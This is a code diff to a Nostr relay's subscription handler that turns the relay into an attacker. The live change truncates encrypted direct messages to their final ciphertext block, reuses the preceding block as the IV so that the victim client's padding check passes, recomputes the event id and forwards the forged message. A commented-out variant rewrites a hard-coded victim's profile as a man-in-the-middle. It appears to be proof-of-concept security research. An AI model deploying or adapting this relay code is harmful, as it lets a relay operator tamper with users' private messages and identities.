@@ -4,7 +4,7 @@ import { pipeline } from 'stream/promises'
 
 import { createEndOfStoredEventsNoticeMessage, createNoticeMessage, createOutgoingEventMessage } from '../utils/messages'
 import { IAbortable, IMessageHandler } from '../@types/message-handlers'
-import { isEventMatchingFilter, toNostrEvent } from '../utils/event'
+import {getEventHash, isEventMatchingFilter, toNostrEvent} from '../utils/event'
 import { streamEach, streamEnd, streamFilter, streamMap } from '../utils/stream'
 import { SubscriptionFilter, SubscriptionId } from '../@types/subscription'
 import { createLogger } from '../factories/logger-factory'
@@ -13,7 +13,9 @@ import { IEventRepository } from '../@types/repositories'
 import { IWebSocketAdapter } from '../@types/adapters'
 import { Settings } from '../@types/settings'
 import { SubscribeMessage } from '../@types/messages'
-import { WebSocketAdapterEvent } from '../constants/adapter'
+import {WebSocketAdapterEvent, WebSocketServerAdapterEvent} from '../constants/adapter'
+import {EventKinds} from "../constants/base";
+import cluster from "cluster";
 
 const debug = createLogger('subscribe-message-handler')
 
@@ -50,8 +52,70 @@ export class SubscribeMessageHandler implements IMessageHandler, IAbortable {
 
   private async fetchAndSend(subscriptionId: string, filters: SubscriptionFilter[]): Promise<void> {
     debug('fetching events for subscription %s with filters %o', subscriptionId, filters)
-    const sendEvent = (event: Event) =>
-      this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+   /*
+   const sendEvent = (event: Event) => {
+      console.log('sendEvent Server->Client')
+      console.log(event)
+      // victim public key in hex string
+      const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+      if(event.kind==0 && event.pubkey==target_pub){
+        console.log('Do MITM on profile')
+
+        event.content = '{"display_name":"BobMITM","website":"","name":"","lud06":"","about":""}'
+        event.created_at = Math.floor(Date.now() / 1000)
+        getEventHash(event).then((newid)=>{
+          event.id = newid
+          console.log('MITM event')
+          console.log(event)
+          this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+        })
+
+      }else{
+        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+      }
+    }
+    */
+    const sendEvent = (event: Event) => {
+      console.log('---------')
+      console.log('event on sendEvent on subscribe-message-handler.ts')
+      console.log(event)
+      // do truncated replay attack on EncryptedDM
+      // eslint-disable-next-line max-len
+      if(event.kind == EventKinds.ENCRYPTED_DIRECT_MESSAGE /*){ //*/ && event.content.length>52) { // 52 is the length of 1 block + iv in the base64 format
+        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+        // @ts-ignore
+        const a = event.content.split('?')
+        let iv = ''
+        let ct = ''
+        if(a[1].includes('iv=')){
+          iv = a[1]
+          ct = a[0]
+        }else{
+          iv = a[0]
+          ct = a[1]
+        }
+        // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+        // @ts-ignore
+        // save the first block only.
+        //event.content = Buffer.from(ct, 'base64').slice(0, 16).toString('base64') +'?'+ iv
+        // save the last block only ( for passing the padding check on the victim client )
+        const blocks = Buffer.from(ct, 'base64')
+        iv = 'iv=' + blocks.slice(blocks.length-32, blocks.length-16).toString('base64')
+        event.content = blocks.slice(blocks.length-16, blocks.length).toString('base64') +'?'+ iv
+
+        getEventHash(event).then(id =>{
+          event.id = id
+          console.log('forged DM')
+          console.log(event)
+          console.log('---------')
+          this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+        })
+      }else{
+        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
+      }
+
+    }
+
     const sendEOSE = () =>
       this.webSocket.emit(WebSocketAdapterEvent.Message, createEndOfStoredEventsNoticeMessage(subscriptionId))
     const isSubscribedToEvent = SubscribeMessageHandler.isClientSubscribedToEvent(filters)
